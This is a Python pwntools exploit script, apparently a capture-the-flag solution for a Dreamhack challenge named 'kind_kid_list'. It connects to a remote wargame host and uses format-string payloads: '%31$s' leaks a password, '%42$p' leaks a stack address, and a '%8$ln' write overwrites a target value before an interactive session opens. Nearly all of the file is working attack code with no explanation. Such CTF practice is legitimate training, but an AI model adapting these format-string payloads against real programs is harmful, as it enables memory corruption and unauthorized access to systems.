from pwn import *

context.log_level = "debug"

# r = process("./kind_kid_list")
r = remote("host3.dreamhack.games", 9175)

input()

#find password
r.sendlineafter(b">> ", b'2')
r.sendlineafter(b"Password :", b"%31$s")
password = r.recvuntil(b"is")[:-3]

r.sendlineafter(b">> ", b'2')
r.sendlineafter(b"Password :", password)
r.sendlineafter(b"Name : ", b"wyv3rn")

#change dest
r.sendlineafter(b">> ", b'2')
r.sendlineafter(b"Password :", b"%42$p")
dest = int(r.recvuntil(b"is")[:-3].ljust(8, b"\x00"), 16) - 0x1d8

r.sendlineafter(b">> ", b'2')
r.sendlineafter(b"Password :", password)
r.sendlineafter(b"Name : ", p64(dest))

r.sendlineafter(b">> ", b'2')
r.sendlineafter(b"Password :", b"a%8$ln")

r.sendlineafter(b">> ", b'3')

r.interactive()
